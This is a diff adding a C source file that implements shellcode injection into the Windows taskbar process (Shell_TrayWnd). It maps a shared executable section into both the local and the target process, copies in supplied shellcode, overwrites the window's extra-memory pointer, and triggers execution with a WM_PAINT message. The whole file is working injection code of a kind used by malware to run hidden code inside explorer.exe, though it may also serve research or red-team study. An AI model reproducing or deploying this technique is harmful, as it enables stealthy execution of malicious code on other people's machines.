@@ -1,0 +1,115 @@
+#include "window_long_inject.h"
+
+#include <stdio.h>
+
+//for injection into Shell_TrayWnd
+PVOID map_code_with_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
+{
+    HANDLE hSection = NULL;
+    OBJECT_ATTRIBUTES hAttributes;
+    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
+
+    LARGE_INTEGER maxSize;
+    maxSize.HighPart = 0;
+    maxSize.LowPart = sizeof(LPVOID) * 2; //we need space for 2 handles
+    NTSTATUS status = NULL;
+    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
+    {
+        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
+        return NULL;
+    }
+    printf("Section handle: %x\n", hSection);
+
+    PVOID sectionBaseAddress = NULL;
+    SIZE_T viewSize = 0;
+    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
+
+    // map the section in context of current process:
+    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+    {
+        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
+        return NULL;
+    }
+    printf("Section BaseAddress: %p\n", sectionBaseAddress);
+
+    //map the new section into context of opened process
+    PVOID sectionBaseAddress2 = NULL;
+    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+    {
+        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
+        return NULL;
+    }
+
+    LPVOID shellcode_remote_ptr = sectionBaseAddress2;
+    LPVOID shellcode_local_ptr = sectionBaseAddress;
+
+    //the same page have double mapping - remote and local, so local modifications are reflected remotely
+    memcpy (shellcode_local_ptr, shellcode, shellcodeSize);
+    printf("Shellcode copied!\n");
+
+    LPVOID handles_remote_ptr = (BYTE*) shellcode_remote_ptr + shellcodeSize;
+    LPVOID handles_local_ptr = (BYTE*) shellcode_local_ptr + shellcodeSize;
+
+    //store the remote addresses
+    PVOID buf_va = (BYTE*) handles_remote_ptr;
+    DWORD hop1 = (DWORD) buf_va + sizeof(DWORD);
+    DWORD shellc_va = (DWORD) shellcode_remote_ptr;
+
+    memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(DWORD));
+    memcpy((BYTE*)handles_local_ptr  + sizeof(DWORD), &shellc_va, sizeof(DWORD));
+
+    //unmap from the context of current process
+    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
+    ZwClose(hSection);
+
+    printf("Section mapped at address: %p\n", sectionBaseAddress2);
+    return shellcode_remote_ptr;
+}
+
+bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
+{
+    HWND hWnd = FindWindow(L"Shell_TrayWnd", NULL);
+    if (hWnd == NULL) return false;
+
+    DWORD pid = 0;
+    GetWindowThreadProcessId(hWnd, &pid);
+    printf("PID:\t%p\n", pid);
+   
+    LONG winLong = GetWindowLongW(hWnd, DWL_MSGRESULT);
+    printf("WindowLong:\t%p\n", winLong);
+
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, false, pid);
+    if (hProcess == NULL) {
+        return false;
+    }
+
+    LPVOID remote_shellcode_ptr = map_code_with_addresses_into_process(hProcess, shellcode, shellcodeSize);
+    if (remote_shellcode_ptr == NULL) {
+        return false;
+    }
+    LPVOID remote_handles_ptr = (BYTE*) remote_shellcode_ptr + shellcodeSize;
+    
+    printf("Saving handles to:\t%p\n", remote_handles_ptr);
+
+    //restore the previous value:
+    SetWindowLong(hWnd, DWL_MSGRESULT, (LONG) remote_handles_ptr);
+
+    //send signal to execute the injected code
+    SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
+
+    //procedure will be triggered on every message
+    //in order to avoid repetitions, injected code should restore the previous value after the first exection
+    //here we are checking if it is done
+    size_t max_wait = 5;
+    while (GetWindowLong(hWnd, DWL_MSGRESULT) != winLong) {
+        //not restored, wait more
+        Sleep(100);
+        if ((max_wait--) == 0) {
+            //don't wait longer, restore by yourself
+            SetWindowLong(hWnd, DWL_MSGRESULT, winLong);
+            SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
+        }
+    }    
+    CloseHandle(hProcess);
+    return true;
+}
